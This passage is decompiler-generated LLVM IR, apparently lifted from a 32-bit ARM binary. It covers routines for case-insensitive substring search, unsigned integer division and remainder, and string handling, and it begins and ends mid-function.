  %v0_b40046 = phi i32 [ %v1_b3e0, %dec_label_pc_b3d4 ], [ %v2_b318, %dec_label_pc_b318 ], [ %v0_b40047, %dec_label_pc_b398 ]
  %stack_var_-24.2 = phi i8* [ %stack_var_-24.327, %dec_label_pc_b3d4 ], [ %stack_var_-24.0, %dec_label_pc_b318 ], [ %stack_var_-24.327, %dec_label_pc_b398 ]
  %v0_b3e4 = load i32, i32* @r4, align 4
  %v1_b3e4 = add i32 %v0_b3e4, 1
  store i32 %v1_b3e4, i32* @r4, align 4
  %v1_b3e8 = inttoptr i32 %v1_b3e4 to i8*
  %v2_b3e8 = load i8, i8* %v1_b3e8, align 1
  %v2_b3ec = icmp eq i8 %v2_b3e8, 0
  br i1 %v2_b3ec, label %dec_label_pc_b3f4.loopexit, label %dec_label_pc_b250

dec_label_pc_b3f4.loopexit:                       ; preds = %dec_label_pc_b3e4, %dec_label_pc_b258
  %v0_b40014.ph = phi i32 [ %v0_b40047, %dec_label_pc_b258 ], [ %v0_b40046, %dec_label_pc_b3e4 ]
  %v0_b3f4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3f4.loopexit, %dec_label_pc_b234
  %v0_b3f4 = phi i32 [ %v0_b238, %dec_label_pc_b234 ], [ %v0_b3f4.pre, %dec_label_pc_b3f4.loopexit ]
  %v0_b40014 = phi i32 [ 0, %dec_label_pc_b234 ], [ %v0_b40014.ph, %dec_label_pc_b3f4.loopexit ]
  %v2_b3f4 = icmp eq i32 %v0_b3f4, 0
  br i1 %v2_b3f4, label %.thread10.thread, label %bb62

.thread10.thread:                                 ; preds = %dec_label_pc_b3f4
  store i32 %v0_b40014, i32* %r0.global-to-local, align 4
  br label %bb63

bb62:                                             ; preds = %dec_label_pc_b3f4
  %v2_b3f8 = inttoptr i32 %v0_b3f4 to i32*
  %v3_b3f8 = load i32, i32* %v2_b3f8, align 4
  store i32 %v3_b3f8, i32* %r2.global-to-local, align 4
  store i32 %v0_b40014, i32* %r0.global-to-local, align 4
  %v4_b404 = inttoptr i32 %v3_b3f8 to i8*
  store i8 0, i8* %v4_b404, align 1
  br label %bb63

bb63:                                             ; preds = %.thread10.thread, %bb62
  store i32 %v3_b234, i32* @r4, align 4
  store i32 %v9_b234, i32* @r6, align 4
  ret i32 %v0_b40014

; uselistorder directives
  uselistorder i32 %v0_b40014, { 0, 2, 1 }
  uselistorder i32 %v0_b3f4, { 1, 0 }
  uselistorder i8 %v2_b3e8, { 1, 0 }
  uselistorder i32 %v1_b3e4, { 1, 2, 0 }
  uselistorder i32 %v3_b2ac, { 1, 2, 0 }
  uselistorder i32 %v0_b2a0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b2a4, { 1, 0 }
  uselistorder i32 %v1_b284, { 0, 2, 1 }
  uselistorder i32 %v1_b280, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v0_b28815, { 1, 0, 2 }
  uselistorder i32 %v1_b258, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24.327, { 7, 1, 6, 5, 4, 0, 3, 2 }
  uselistorder i32 %v0_b258, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 7, 6, 4, 0, 8, 9, 1, 2 }
  uselistorder i8 48, { 2, 1, 0, 3 }
  uselistorder i8 45, { 1, 3, 2, 0 }
  uselistorder i8 37, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_b3e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b3d4, { 1, 0 }
  uselistorder label %dec_label_pc_b3cc, { 1, 0 }
  uselistorder label %dec_label_pc_b2ac, { 1, 0 }
  uselistorder label %dec_label_pc_b280, { 1, 0 }
  uselistorder label %dec_label_pc_b288.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b250, { 1, 0 }
}

define i32 @function_b410(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b410:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v9_b410 = load i32, i32* @r3, align 4
  %v0_b414 = load i32, i32* @lr, align 4
  %v2_b41c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v11_b434 = call i32 @function_b234(i32* nonnull %stack_var_-24, i32 %arg2, i32 %v2_b41c, i32 %v2_b41c, i32 %arg1, i32 %v2_b41c, i32 %v0_b414, i32 %arg2, i32 %arg3, i32 %v9_b410)
  store i32 %v0_b414, i32* @lr, align 4
  ret i32 %v11_b434

; uselistorder directives
  uselistorder i32 %v2_b41c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_b448(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b448:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_b46011 = inttoptr i32 %arg2 to i8*
  %v4_b46012 = load i8, i8* %v3_b46011, align 1
  %v2_b46414 = icmp eq i8 %v4_b46012, 0
  br i1 %v2_b46414, label %dec_label_pc_b46c, label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b448, %dec_label_pc_b45c
  %v0_b45c = phi i32 [ %v1_b45c, %dec_label_pc_b45c ], [ 0, %dec_label_pc_b448 ]
  %v1_b45c = add i32 %v0_b45c, 1
  %v2_b460 = add i32 %v1_b45c, %arg2
  %v3_b460 = inttoptr i32 %v2_b460 to i8*
  %v4_b460 = load i8, i8* %v3_b460, align 1
  %v2_b464 = icmp eq i8 %v4_b460, 0
  br i1 %v2_b464, label %dec_label_pc_b46c, label %dec_label_pc_b45c

dec_label_pc_b46c:                                ; preds = %dec_label_pc_b45c, %dec_label_pc_b448
  %v1_b4a825 = phi i32 [ 0, %dec_label_pc_b448 ], [ %v1_b45c, %dec_label_pc_b45c ]
  %v0_b46c.in = phi i8 [ %v4_b46012, %dec_label_pc_b448 ], [ %v4_b460, %dec_label_pc_b45c ]
  %v0_b46c = zext i8 %v0_b46c.in to i32
  %v0_b4b82 = load i32, i32* @r1, align 4
  %tmp33 = icmp slt i32 %v0_b4b82, 1
  br i1 %tmp33, label %dec_label_pc_b4c4, label %dec_label_pc_b478

dec_label_pc_b478:                                ; preds = %dec_label_pc_b46c, %dec_label_pc_b4b8.backedge
  %v0_b4bc.in = phi i32 [ %v0_b4bc, %dec_label_pc_b4b8.backedge ], [ %v0_b4b82, %dec_label_pc_b46c ]
  %v0_b49c = phi i32 [ %v1_b49c., %dec_label_pc_b4b8.backedge ], [ %v0_b46c, %dec_label_pc_b46c ]
  %v0_b478 = phi i32 [ %v5_b478, %dec_label_pc_b4b8.backedge ], [ %tmp, %dec_label_pc_b46c ]
  %v0_b4bc = add i32 %v0_b4bc.in, -1
  %v1_b478 = inttoptr i32 %v0_b478 to i8*
  %v2_b478 = load i8, i8* %v1_b478, align 1
  %v3_b478 = zext i8 %v2_b478 to i32
  store i32 %v3_b478, i32* @lr, align 4
  %v5_b478 = add i32 %v0_b478, 1
  %v2_b47c = add i32 %v0_b49c, %arg2
  %v3_b47c = inttoptr i32 %v2_b47c to i8*
  %v4_b47c = load i8, i8* %v3_b47c, align 1
  %v6_b47c = zext i8 %v4_b47c to i32
  %v1_b480 = add nsw i32 %v3_b478, -65
  %v1_b484 = add nsw i32 %v6_b47c, -65
  %tmp40 = icmp ult i32 %v1_b480, 26
  br i1 %tmp40, label %bb, label %bb34

bb:                                               ; preds = %dec_label_pc_b478
  %v5_b48c = or i32 %v3_b478, 96
  store i32 %v5_b48c, i32* @lr, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_b478, %bb
  %v0_b498 = phi i32 [ %v3_b478, %dec_label_pc_b478 ], [ %v5_b48c, %bb ]
  %tmp41 = icmp ult i32 %v1_b484, 26
  br i1 %tmp41, label %bb35, label %bb36

bb35:                                             ; preds = %bb34
  %v5_b494 = or i32 %v6_b47c, 96
  br label %bb36

bb36:                                             ; preds = %bb34, %bb35
  %v1_b498 = phi i32 [ %v6_b47c, %bb34 ], [ %v5_b494, %bb35 ]
  %v9_b498 = icmp eq i32 %v0_b498, %v1_b498
  %v1_b49c = add i32 %v0_b49c, 1
  %v1_b49c. = select i1 %v9_b498, i32 %v1_b49c, i32 0
  br i1 %v9_b498, label %dec_label_pc_b4a8, label %dec_label_pc_b4b8.backedge

dec_label_pc_b4b8.backedge:                       ; preds = %bb36, %dec_label_pc_b4a8
  %tmp37 = icmp slt i32 %v0_b4bc, 1
  br i1 %tmp37, label %dec_label_pc_b4c4, label %dec_label_pc_b478

dec_label_pc_b4a8:                                ; preds = %bb36
  %v9_b4a8 = icmp eq i32 %v1_b49c., %v1_b4a825
  br i1 %v9_b4a8, label %dec_label_pc_b4b0, label %dec_label_pc_b4b8.backedge

dec_label_pc_b4b0:                                ; preds = %dec_label_pc_b4a8
  %v2_b4b0 = sub i32 %v5_b478, %tmp
  ret i32 %v2_b4b0

dec_label_pc_b4c4:                                ; preds = %dec_label_pc_b4b8.backedge, %dec_label_pc_b46c
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_b49c., { 1, 0 }
  uselistorder i32 %v0_b478, { 1, 0 }
  uselistorder i32 %v0_b49c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 0, { 18, 10, 6, 20, 19, 11, 22, 1, 21, 12, 0, 7, 23, 8, 24, 13, 25, 26, 27, 14, 28, 17, 9, 29, 30, 31, 32, 33, 34, 36, 16, 4, 35, 2, 15, 5, 37, 3, 38, 39, 41, 40, 42, 43 }
  uselistorder label %dec_label_pc_b4b8.backedge, { 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_b478, { 1, 0 }
  uselistorder label %dec_label_pc_b45c, { 1, 0 }
}

define i32 @function_b4cc() local_unnamed_addr {
dec_label_pc_b4cc:
  %v0_b4cc = load i32, i32* @r1, align 4
  %v1_b4cc = add i32 %v0_b4cc, -1
  %v7_b4cc = icmp eq i32 %v0_b4cc, 1
  br i1 %v7_b4cc, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_b4cc
  %v2_b4d0 = load i32, i32* @r0, align 4
  ret i32 %v2_b4d0

bb82:                                             ; preds = %dec_label_pc_b4cc
  %v2_b4cc = icmp eq i32 %v0_b4cc, 0
  br i1 %v2_b4cc, label %dec_label_pc_b5b4, label %dec_label_pc_b4d8

dec_label_pc_b4d8:                                ; preds = %bb82
  %v0_b4d8 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_b4d8, %v0_b4cc
  br i1 %tmp, label %dec_label_pc_b4e0, label %dec_label_pc_b56c

dec_label_pc_b4e0:                                ; preds = %dec_label_pc_b4d8
  %v2_b4e0 = and i32 %v1_b4cc, %v0_b4cc
  %v4_b4e0 = icmp eq i32 %v2_b4e0, 0
  br i1 %v4_b4e0, label %dec_label_pc_b578, label %dec_label_pc_b4e8

dec_label_pc_b4e8:                                ; preds = %dec_label_pc_b4e0
  %v3_b4e8 = icmp ult i32 %v0_b4cc, 536870912
  br i1 %v3_b4e8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_b4e8
  %v4_b4ec = mul i32 %v0_b4cc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_b4e8, %.thread
  %v0_b50c.pr36.ph = phi i32 [ %v4_b4ec, %.thread ], [ %v0_b4cc, %dec_label_pc_b4e8 ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_b4e8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_b50c.pr36 = phi i32 [ %v4_b500, %bb85 ], [ %v0_b50c.pr36.ph, %.preheader.preheader ]
  %v1_b504 = phi i32 [ %v4_b504, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_b4f8 = icmp ugt i32 %v0_b50c.pr36, 268435455
  br i1 %v2_b4f8, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_b50cthread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_b4fc = icmp ult i32 %v0_b50c.pr36, %v0_b4d8
  br i1 %v4_b4fc, label %bb84, label %dec_label_pc_b50cthread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_b500 = and i32 %v0_b50c.pr36, 268435456
  %v3_b500 = icmp eq i32 %v2_b500, 0
  %v4_b500 = mul i32 %v0_b50c.pr36, 16
  br i1 %v3_b500, label %bb85, label %dec_label_pc_b50c.loopexit

bb85:                                             ; preds = %bb84
  %v2_b504 = and i32 %v1_b504, 268435456
  %v3_b504 = icmp eq i32 %v2_b504, 0
  %v4_b504 = mul i32 %v1_b504, 16
  br i1 %v3_b504, label %.preheader, label %dec_label_pc_b50cthread-pre-split.loopexit.loopexit

dec_label_pc_b50cthread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_b51848.ph = phi i32 [ %v1_b504, %bb83 ], [ %v4_b504, %bb85 ]
  %v0_b50c.pr38.ph = phi i32 [ %v0_b50c.pr36, %bb83 ], [ %v4_b500, %bb85 ]
  br label %dec_label_pc_b50cthread-pre-split.loopexit

dec_label_pc_b50cthread-pre-split.loopexit:       ; preds = %dec_label_pc_b50cthread-pre-split.loopexit.loopexit, %.thread2
  %v1_b51848 = phi i32 [ %v1_b504, %.thread2 ], [ %v1_b51848.ph, %dec_label_pc_b50cthread-pre-split.loopexit.loopexit ]
  %v0_b50c.pr38 = phi i32 [ %v0_b50c.pr36, %.thread2 ], [ %v0_b50c.pr38.ph, %dec_label_pc_b50cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_b50cthread-pre-split

dec_label_pc_b50cthread-pre-split:                ; preds = %dec_label_pc_b50cthread-pre-split.loopexit, %bb87
  %v1_b51846 = phi i32 [ %v1_b51848, %dec_label_pc_b50cthread-pre-split.loopexit ], [ %v3_b518, %bb87 ]
  %v0_b50c.pr = phi i32 [ %v0_b50c.pr38, %dec_label_pc_b50cthread-pre-split.loopexit ], [ %v3_b514, %bb87 ]
  br label %dec_label_pc_b50c

dec_label_pc_b50c.loopexit:                       ; preds = %bb84
  br label %dec_label_pc_b50c

dec_label_pc_b50c:                                ; preds = %dec_label_pc_b50c.loopexit, %dec_label_pc_b50cthread-pre-split
  %v1_b518 = phi i32 [ %v1_b51846, %dec_label_pc_b50cthread-pre-split ], [ %v1_b504, %dec_label_pc_b50c.loopexit ]
  %v1_b514 = phi i32 [ %v0_b50c.pr, %dec_label_pc_b50cthread-pre-split ], [ %v4_b500, %dec_label_pc_b50c.loopexit ]
  %v2_b50c = icmp slt i32 %v1_b514, 0
  br i1 %v2_b50c, label %dec_label_pc_b520, label %bb86

bb86:                                             ; preds = %dec_label_pc_b50c
  %v4_b510 = icmp ult i32 %v1_b514, %v0_b4d8
  br i1 %v4_b510, label %bb87, label %dec_label_pc_b520

bb87:                                             ; preds = %bb86
  %v3_b514 = mul i32 %v1_b514, 2
  %v2_b518 = icmp slt i32 %v1_b518, 0
  %v3_b518 = mul i32 %v1_b518, 2
  br i1 %v2_b518, label %dec_label_pc_b520, label %dec_label_pc_b50cthread-pre-split

dec_label_pc_b520:                                ; preds = %bb86, %dec_label_pc_b50c, %bb87
  %v2_b52c59 = phi i32 [ %v3_b518, %bb87 ], [ %v1_b518, %bb86 ], [ %v1_b518, %dec_label_pc_b50c ]
  %v1_b52451 = phi i32 [ %v3_b514, %bb87 ], [ %v1_b514, %bb86 ], [ %v1_b514, %dec_label_pc_b50c ]
  br label %dec_label_pc_b524

dec_label_pc_b524:                                ; preds = %.thread11, %dec_label_pc_b520
  %v1_b558 = phi i32 [ %v4_b558, %.thread11 ], [ %v2_b52c59, %dec_label_pc_b520 ]
  %v1_b52c = phi i32 [ %v0_b564, %.thread11 ], [ 0, %dec_label_pc_b520 ]
  %v1_b55c = phi i32 [ %v4_b55c, %.thread11 ], [ %v1_b52451, %dec_label_pc_b520 ]
  %v1_b528 = phi i32 [ %v0_b554, %.thread11 ], [ %v0_b4d8, %dec_label_pc_b520 ]
  %v3_b524 = icmp ult i32 %v1_b528, %v1_b55c
  br i1 %v3_b524, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_b524
  %v3_b528 = sub i32 %v1_b528, %v1_b55c
  %v3_b52c = or i32 %v1_b52c, %v1_b558
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_b524, %bb88
  %v1_b534 = phi i32 [ %v1_b528, %dec_label_pc_b524 ], [ %v3_b528, %bb88 ]
  %v1_b538 = phi i32 [ %v1_b52c, %dec_label_pc_b524 ], [ %v3_b52c, %bb88 ]
  %v4_b530 = udiv i32 %v1_b55c, 2
  %v6_b530 = icmp ult i32 %v1_b534, %v4_b530
  br i1 %v6_b530, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_b534 = urem i32 %v1_b55c, 2
  %v4_b534 = icmp eq i32 %v3_b534, 0
  %v6_b534 = sub i32 %v1_b534, %v4_b530
  br i1 %v4_b534, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_b538 = udiv i32 %v1_b558, 2
  %v6_b538 = or i32 %v1_b538, %v5_b538
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_b540 = phi i32 [ %v6_b534, %bb89 ], [ %v1_b534, %.thread7 ], [ %v6_b534, %bb90 ]
  %v1_b544 = phi i32 [ %v1_b538, %bb89 ], [ %v1_b538, %.thread7 ], [ %v6_b538, %bb90 ]
  %v4_b53c = udiv i32 %v1_b55c, 4
  %v6_b53c = icmp ult i32 %v1_b540, %v4_b53c
  br i1 %v6_b53c, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_b540 = and i32 %v1_b55c, 2
  %v4_b540 = icmp eq i32 %v3_b540, 0
  %v6_b540 = sub i32 %v1_b540, %v4_b53c
  br i1 %v4_b540, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_b544 = udiv i32 %v1_b558, 4
  %v6_b544 = or i32 %v1_b544, %v5_b544
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_b54c = phi i32 [ %v6_b540, %bb91 ], [ %v1_b540, %.thread8 ], [ %v6_b540, %bb92 ]
  %v1_b550 = phi i32 [ %v1_b544, %bb91 ], [ %v1_b544, %.thread8 ], [ %v6_b544, %bb92 ]
  %v4_b548 = udiv i32 %v1_b55c, 8
  %v6_b548 = icmp ult i32 %v1_b54c, %v4_b548
  br i1 %v6_b548, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_b54c = and i32 %v1_b55c, 4
  %v4_b54c = icmp eq i32 %v3_b54c, 0
  %v6_b54c = sub i32 %v1_b54c, %v4_b548
  br i1 %v4_b54c, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_b550 = udiv i32 %v1_b558, 8
  %v6_b550 = or i32 %v1_b550, %v5_b550
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_b564 = phi i32 [ %v1_b550, %bb93 ], [ %v1_b550, %.thread9 ], [ %v6_b550, %bb94 ]
  %v0_b554 = phi i32 [ %v6_b54c, %bb93 ], [ %v1_b54c, %.thread9 ], [ %v6_b54c, %bb94 ]
  %v2_b554 = icmp eq i32 %v0_b554, 0
  br i1 %v2_b554, label %dec_label_pc_b564, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_b558, 16
  br i1 %tmp142, label %dec_label_pc_b564, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_b558 = udiv i32 %v1_b558, 16
  %v4_b55c = udiv i32 %v1_b55c, 16
  br label %dec_label_pc_b524

dec_label_pc_b564:                                ; preds = %thread-pre-split, %bb95
  ret i32 %v0_b564

dec_label_pc_b56c:                                ; preds = %dec_label_pc_b4d8
  %v9_b4d8 = icmp eq i32 %v0_b4d8, %v0_b4cc
  %. = zext i1 %v9_b4d8 to i32
  ret i32 %.

dec_label_pc_b578:                                ; preds = %dec_label_pc_b4e0
  %v2_b578 = icmp ugt i32 %v0_b4cc, 65535
  br i1 %v2_b578, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_b578
  %v2_b57c = and i32 %v0_b4cc, 32768
  %v3_b57c = icmp eq i32 %v2_b57c, 0
  %v4_b57c = udiv i32 %v0_b4cc, 65536
  br i1 %v3_b57c, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_b578
  %v0_b58865 = phi i32 [ %v0_b4cc, %dec_label_pc_b578 ], [ %v4_b57c, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_b58c = phi i32 [ %v0_b58865, %.thread16 ], [ %v4_b57c, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_b588 = icmp ugt i32 %v1_b58c, 255
  br i1 %v2_b588, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_b58c = and i32 %v1_b58c, 128
  %v3_b58c = icmp eq i32 %v2_b58c, 0
  %v4_b58c = udiv i32 %v1_b58c, 256
  br i1 %v3_b58c, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_b590 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_b59c = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_b590, %bb102 ]
  %v1_b598 = phi i32 [ %v1_b58c, %bb100 ], [ %v4_b58c, %bb101 ], [ %v4_b58c, %bb102 ]
  %v2_b594 = icmp ugt i32 %v1_b598, 15
  br i1 %v2_b594, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_b598 = and i32 %v1_b598, 8
  %v3_b598 = icmp eq i32 %v2_b598, 0
  %v4_b598 = udiv i32 %v1_b598, 16
  br i1 %v3_b598, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_b59c = add nsw i32 %v1_b59c, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_b5a4 = phi i32 [ %v1_b59c, %.thread17 ], [ %v1_b59c, %bb103 ], [ %v2_b59c, %bb104 ]
  %v5_b5a8 = phi i32 [ %v1_b598, %.thread17 ], [ %v4_b598, %bb103 ], [ %v4_b598, %bb104 ]
  %v2_b5a0 = icmp ugt i32 %v5_b5a8, 3
  %v7_b5a0 = icmp eq i32 %v5_b5a8, 4
  %v2_b5a4 = xor i1 %v7_b5a0, true
  %v3_b5a4 = and i1 %v2_b5a0, %v2_b5a4
  br i1 %v3_b5a4, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_b5a4 = add nsw i32 %v4_b5a4, 3
  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_b5a8 = phi i32 [ %v4_b5a4, %.thread18 ], [ %v5_b5a4, %bb105 ]
  %v2_b5a8 = xor i1 %v2_b5a0, true
  %v3_b5a8 = or i1 %v7_b5a0, %v2_b5a8
  br i1 %v3_b5a8, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_b5a8 = udiv i32 %v5_b5a8, 2
  %v9_b5a8 = add i32 %v4_b5a8, %v8_b5a8
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_b5ac = phi i32 [ %v4_b5a8, %bb106 ], [ %v9_b5a8, %bb107 ]
  %v6_b5ac = lshr i32 %v0_b4d8, %v1_b5ac
  ret i32 %v6_b5ac

dec_label_pc_b5b4:                                ; preds = %bb82
  %v0_b5b4 = load i32, i32* @lr, align 4
  %v0_b5b8 = call i32 @function_b78c()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_b5b4)
  %v9_b5c4 = load i32, i32* @lr, align 4
  %v0_b5c8 = call i32 @function_b4cc()
  store i32 %v9_b5c4, i32* @lr, align 4
  ret i32 %v0_b5c8

; uselistorder directives
  uselistorder i32 %v4_b5a8, { 1, 0 }
  uselistorder i1 %v7_b5a0, { 1, 0 }
  uselistorder i32 %v4_b598, { 1, 0 }
  uselistorder i32 %v1_b598, { 1, 0, 2, 3 }
  uselistorder i32 %v4_b58c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_b58c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_b57c, { 1, 0 }
  uselistorder i32 %v0_b554, { 1, 0 }
  uselistorder i32 %v4_b548, { 1, 0 }
  uselistorder i32 %v1_b550, { 1, 2, 0 }
  uselistorder i32 %v4_b53c, { 1, 0 }
  uselistorder i32 %v1_b544, { 1, 2, 0 }
  uselistorder i32 %v4_b530, { 1, 0 }
  uselistorder i32 %v1_b538, { 1, 2, 0 }
  uselistorder i32 %v1_b55c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_b52c, { 1, 0 }
  uselistorder i32 %v1_b558, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_b518, { 1, 0 }
  uselistorder i32 %v3_b514, { 1, 0 }
  uselistorder i32 %v1_b514, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_b518, { 1, 2, 0, 3 }
  uselistorder i32 %v4_b504, { 1, 0 }
  uselistorder i32 %v4_b500, { 2, 1, 0 }
  uselistorder i32 %v1_b504, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_b50c.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_b4d8, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_b4cc, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder i32 255, { 4, 5, 0, 6, 1, 7, 2, 8, 3, 9 }
  uselistorder i32 65535, { 2, 0, 1 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_b564, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_b520, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b50cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_b5dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b5dc:
  store i32 %arg1, i32* @r0, align 4
  %v1_b5dc = add i32 %arg2, -1
  %v2_b5dc = icmp eq i32 %arg2, 0
  br i1 %v2_b5dc, label %dec_label_pc_b698, label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b5dc
  %v7_b5dc = icmp eq i32 %arg2, 1
  br i1 %v7_b5dc, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_b5e4
  %v1_b5e4 = load i32, i32* @r0, align 4
  %v10_b5e4 = icmp eq i32 %v1_b5e4, %arg2
  br i1 %v10_b5e4, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_b5e4, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_b5e4 = icmp ult i32 %v1_b5e4, %arg2
  br i1 %v4_b5e4, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_b5ec = and i32 %v1_b5dc, %arg2
  %v8_b5ec = icmp eq i32 %v6_b5ec, 0
  br i1 %v8_b5ec, label %.thread67, label %dec_label_pc_b5fc.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_b5f0 = phi i32 [ %v1_b5e4, %bb75 ], [ 0, %.thread65 ]
  %v3_b5f0 = and i32 %v1_b5f0, %v1_b5dc
  br label %bb76

dec_label_pc_b5fc.preheader:                      ; preds = %bb75
  %v2_b5fc99 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_b5fc99, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_b68c, %bb74, %bb89, %bb84, %dec_label_pc_b65c, %.thread67
  %v5_b5f4 = phi i32 [ %v1_b5e4, %bb74 ], [ %v3_b5f0, %.thread67 ], [ %v1_b638.v6_b638.v6_b640.v6_b648, %dec_label_pc_b65c ], [ 0, %bb84 ], [ %v1_b690, %dec_label_pc_b68c ], [ %v2_b68c, %bb89 ]
  ret i32 %v5_b5f4

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_b5fc.preheader
  %v0_b610.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_b5fc.preheader ], [ %v4_b604, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_b5fc.preheader ], [ %v2_b60811, %.thread1.thread9 ]
  br label %dec_label_pc_b610thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_b5fc.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_b60811, %.thread1.thread9 ], [ 0, %dec_label_pc_b5fc.preheader ]
  %v0_b610.pr33100 = phi i32 [ %v4_b604, %.thread1.thread9 ], [ %arg2, %dec_label_pc_b5fc.preheader ]
  %v4_b600 = icmp ult i32 %v0_b610.pr33100, %v1_b5e4
